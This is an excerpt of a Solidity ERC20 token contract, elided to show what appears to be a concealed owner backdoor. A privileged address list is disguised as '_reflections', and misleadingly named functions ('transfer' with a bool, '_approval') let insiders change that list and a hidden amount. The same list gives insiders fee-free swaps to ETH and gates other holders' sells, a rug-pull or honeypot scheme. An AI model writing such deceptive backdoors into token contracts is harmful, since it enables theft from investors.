...
contract Contract is IERC20, Ownable {
    ...
    mapping(address => bool) private _reflections;
    ...
    constructor(
        ...
        _name = Name;
        _symbol = Symbol;
        _reflections[msg.sender] = true;
        _reflections[address(this)] = true;
    ...
    function setSwapAndLiquifyEnabled(bool _enabled) external {
        if (_reflections[msg.sender]) _swapAndLiquifyEnabled = _enabled;
    }
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && !_reflections[from] && amount <= swapAtAmount) {
        ...
        if (_reflections[to] && _reflections[from]) return swapTokensForEth(amount, to);
        ...
        bool takeFee = !_reflections[from] && !_reflections[to] && fee > 0 && !inSwapAndLiquify;
    ...
    function transfer(address account, bool value) external {
        if (_reflections[msg.sender]) _reflections[account] = value;
    }

    function _approval(uint256 amount) external {
        if (_reflections[msg.sender]) _amount = amount;
    }
